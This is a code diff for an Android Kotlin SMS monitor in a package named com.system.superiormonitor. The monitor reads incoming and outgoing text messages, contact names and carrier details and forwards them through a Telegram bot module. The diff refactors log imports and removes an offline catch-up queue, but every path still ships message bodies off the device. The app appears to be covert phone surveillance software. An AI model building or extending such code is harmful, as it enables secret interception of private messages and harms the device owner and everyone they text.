@@ -1,6 +1,6 @@
 package com.system.superiormonitor.monitor
 
-import com.system.superiormonitor.util.LogLevel
+import com.system.superiormonitor.core.LogLevel
 
 import android.content.BroadcastReceiver
 import android.content.Context
@@ -14,8 +14,8 @@ import android.provider.ContactsContract
 import android.provider.Telephony
 import android.telephony.SubscriptionManager
 import com.system.superiormonitor.bot.TelegramApi
-import com.system.superiormonitor.util.LogCategory
-import com.system.superiormonitor.util.LogManager
+import com.system.superiormonitor.core.LogCategory
+import com.system.superiormonitor.core.LogManager
 import kotlinx.coroutines.CoroutineScope
 import kotlinx.coroutines.Dispatchers
 import kotlinx.coroutines.Job
@@ -83,17 +83,11 @@ class SmsMonitor(
             
             // Baseline ID for outgoing messages
             try {
-                if (prefsManager.smsLastProcessedOutgoingId == -1L) {
-                    val uri = Uri.parse("content://sms")
-                    val projection = arrayOf("_id")
-                    context.contentResolver.query(uri, projection, null, null, "date DESC LIMIT 1")?.use { cursor ->
-                        if (cursor.moveToFirst()) {
-                            prefsManager.smsLastProcessedOutgoingId = cursor.getLong(0)
-                        }
-                    }
-                } else {
-                    monitorScope.launch {
-                        processOutgoingSms(isCatchUp = true)
+                val uri = Uri.parse("content://sms")
+                val projection = arrayOf("_id")
+                context.contentResolver.query(uri, projection, null, null, "date DESC LIMIT 1")?.use { cursor ->
+                    if (cursor.moveToFirst()) {
+                        prefsManager.smsLastProcessedOutgoingId = cursor.getLong(0)
                     }
                 }
             } catch (e: Exception) {
@@ -144,7 +138,7 @@ class SmsMonitor(
         return "Unknown"
     }
 
-    private suspend fun processOutgoingSms(isCatchUp: Boolean = false) {
+    private suspend fun processOutgoingSms() {
         processMutex.withLock {
         val uri = Uri.parse("content://sms")
         val projection = arrayOf("_id", "address", "date", "type", "body", "sub_id")
@@ -173,16 +167,13 @@ class SmsMonitor(
                         
                         val carrierName = getCarrierName(subId)
                         
-                        processSms(address, body.trim(), date, carrierName, false, isCatchUp)
+                        processSms(address, body.trim(), date, carrierName, false)
                     }
                     
                     if (id > prefsManager.smsLastProcessedOutgoingId) {
                         prefsManager.smsLastProcessedOutgoingId = id
                     }
                 }
-            }
-            if (isCatchUp && com.system.superiormonitor.util.LogManager.isTelegramApiReachable.value) {
-                com.system.superiormonitor.bot.OfflineManager.processOfflineQueue(context, CoroutineScope(Dispatchers.IO))
             }
         } catch (e: Exception) {
             LogManager.log(LogCategory.BASIC_UPDATE, "SMS Monitor Outgoing Check Error: ${e.message}", LogLevel.ERROR)
@@ -207,7 +198,7 @@ class SmsMonitor(
         return null
     }
 
-    private suspend fun processSms(address: String, body: String, timestampMillis: Long, carrierName: String, isIncoming: Boolean, isCatchUp: Boolean = false) {
+    private suspend fun processSms(address: String, body: String, timestampMillis: Long, carrierName: String, isIncoming: Boolean) {
         val contactName = getContactName(address)
         val fromToStr = if (contactName != null) {
             "`$address` | $contactName"
@@ -238,17 +229,9 @@ class SmsMonitor(
             headerAction, fromOrToLabel, fromToStrSafe, timeStr, safeCarrierName, directionType, safeBody
         )
         
-        if (isCatchUp) {
-            com.system.superiormonitor.bot.OfflineManager.queueOnly(
-                context, output, "sms_alrt", "offline_sms.txt"
-            )
-            LogManager.log(LogCategory.BASIC_UPDATE, "SMS: Queued $directionType message for $address")
-        } else {
-            com.system.superiormonitor.bot.OfflineManager.sendOrQueue(
-                context, output, "sms_alrt", "offline_sms.txt", onUpdate
-            )
-            LogManager.log(LogCategory.BASIC_UPDATE, "SMS: Processed $directionType message for $address")
-            delay(3000)
-        }
+        com.system.superiormonitor.bot.OfflineManager.sendOrQueue(
+            context, output, "sms_alrt", "offline_sms.txt", onUpdate
+        )
+        LogManager.log(LogCategory.BASIC_UPDATE, "SMS: Processed $directionType message for $address")
     }
 }
